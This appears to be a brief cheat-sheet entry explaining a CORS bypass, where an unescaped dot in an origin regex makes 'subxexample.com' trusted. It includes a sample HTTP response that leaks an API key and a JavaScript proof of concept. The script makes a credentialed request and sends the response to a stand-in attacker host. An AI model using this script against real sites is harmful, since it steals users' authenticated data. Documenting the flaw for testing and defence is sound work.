# Unescaped Dot Bypass

## Description 
The regex used for origin verification contains an unescaped dot (`.`) character.

`wwww.example.com` trusts `wwwaexample.com`, which could be an attacker's domain.

**Severity**: High

## Exploit 
If the target is `sub.example.com`, make requests from `subxexample.com`.

### Example
**Vulnerable Implementation** 
```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://subxexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subxexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit requires that the respective JS script is hosted at `subxexample.com`
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
